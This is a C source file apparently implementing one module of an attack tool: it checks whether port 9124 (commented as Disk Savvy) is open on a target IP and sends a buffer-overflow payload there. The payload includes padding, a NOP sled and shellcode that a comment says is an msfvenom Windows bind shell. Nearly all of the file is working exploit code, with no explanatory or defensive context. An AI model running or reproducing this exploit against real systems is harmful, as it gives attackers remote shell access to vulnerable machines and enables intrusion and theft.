#include "DiskSavvy_44156.h"
int isTarget_DiskSavvy_44156(char* strIP) {
	fd_set writefds;
	int sock;
	int ip;
	struct sockaddr_in sin;
	struct timeval timeout;
	int nfds;
	u_long opt;
	opt = 0;
	//Create socket
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == -1)
		return 0;
	ioctlsocket(sock, FIONBIO, &opt);

	memset(&sin, 0, sizeof(sin));

	/*for debug*/
	printf("%s\n", strIP);
	ip = inet_addr(strIP);
	if (ip == -1)
		return 0;

	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = ip;
	//Attack on port 9124 of Disk Savvy
	sin.sin_port = htons(9124);

	connect(sock, (struct sockaddr*)&sin, sizeof(sin));
	timeout.tv_sec = 0;
	timeout.tv_usec = 0;
	nfds = 0;
	FD_ZERO(&writefds);
	FD_SET((unsigned)sock, &writefds);
	// printf("scan ok!");
	if (select(0, NULL, &writefds, NULL, &timeout) != 1) {
		closesocket(sock);
		return 0;
	}
	else {
		return sock;
	}
}

int DiskSavvy_44156(int sock, char *victim_ip) {
	// int ThreadId;
	int len;
	int sizeof_sa;
	int ret;
	u_long opt;
	void *hThread;
	struct sockaddr_in target_ip;
	struct sockaddr_in sa;
	int fd;

	char recvbuf[4096];
	int recvbuflen = 4096;
	int i;

	opt = 0;
	ioctlsocket(sock, FIONBIO, &opt);
	
	//msfvenom - a x86 --platform windows - p windows / shell_bind_tcp - f py - b '\x00\x02\x0a\x0d\xf8\xfd' --var - name shellcode
	const char buffer1[] = "\x75\x19\xba\xab\x03\x00\x00\x00\x00\x40\x00\x00\xe8\x03\x00\x00\xe8\x03\x00\x00\x3d\x00\x00\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x90\x09\xeb\x05\x13\x6d\x05\x10\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\x83\xc4\x64\xff\xe4\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xba\x71\x6d\xbf\xc8\xd9\xc0\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x53\x83\xed\xfc\x31\x55\x0e\x03\x24\x63\x5d\x3d\x3a\x93\x23\xbe\xc2\x64\x44\x36\x27\x55\x44\x2c\x2c\xc6\x74\x26\x60\xeb\xff\x6a\x90\x78\x8d\xa2\x97\xc9\x38\x95\x96\xca\x11\xe5\xb9\x48\x68\x3a\x19\x70\xa3\x4f\x58\xb5\xde\xa2\x08\x6e\x94\x11\xbc\x1b\xe0\xa9\x37\x57\xe4\xa9\xa4\x20\x07\x9b\x7b\x3a\x5e\x3b\x7a\xef\xea\x72\x64\xec\xd7\xcd\x1f\xc6\xac\xcf\xc9\x16\x4c\x63\x34\x97\xbf\x7d\x71\x10\x20\x08\x8b\x62\xdd\x0b\x48\x18\x39\x99\x4a\xba\xca\x39\xb6\x3a\x1e\xdf\x3d\x30\xeb\xab\x19\x55\xea\x78\x12\x61\x67\x7f\xf4\xe3\x33\xa4\xd0\xa8\xe0\xc5\x41\x15\x46\xf9\x91\xf6\x37\x5f\xda\x1b\x23\xd2\x81\x73\x80\xdf\x39\x84\x8e\x68\x4a\xb6\x11\xc3\xc4\xfa\xda\xcd\x13\xfc\xf0\xaa\x8b\x03\xfb\xca\x82\xc7\xaf\x9a\xbc\xee\xcf\x70\x3c\x0e\x1a\xec\x34\xa9\xf5\x13\xb9\x09\xa6\x93\x11\xe2\xac\x1b\x4e\x12\xcf\xf1\xe7\xbb\x32\xfa\x16\x60\xba\x1c\x72\x88\xea\xb7\xea\x6a\xc9\x0f\x8d\x95\x3b\x38\x39\xdd\x2d\xff\x46\xde\x7b\x57\xd0\x55\x68\x63\xc1\x69\xa5\xc3\x96\xfe\x33\x82\xd5\x9f\x44\x8f\x8d\x3c\xd6\x54\x4d\x4a\xcb\xc2\x1a\x1b\x3d\x1b\xce\xb1\x64\xb5\xec\x4b\xf0\xfe\xb4\x97\xc1\x01\x35\x55\x7d\x26\x25\xa3\x7e\x62\x11\x7b\x29\x3c\xcf\x3d\x83\x8e\xb9\x97\x78\x59\x2d\x61\xb3\x5a\x2b\x6e\x9e\x2c\xd3\xdf\x77\x69\xec\xd0\x1f\x7d\x95\x0c\x80\x82\x4c\x95\xb0\xc8\xcc\xbc\x58\x95\x85\xfc\x04\x26\x70\xc2\x30\xa5\x70\xbb\xc6\xb5\xf1\xbe\x83\x71\xea\xb2\x9c\x17\x0c\x60\x9c\x3d";

	int iResult = 0;

	if (send(sock, buffer1, sizeof(buffer1) - 1, 0) == -1) {
		printf("Can't sent payload\n");
		return 0;
	}
	closesocket(sock);

	return 1;
}

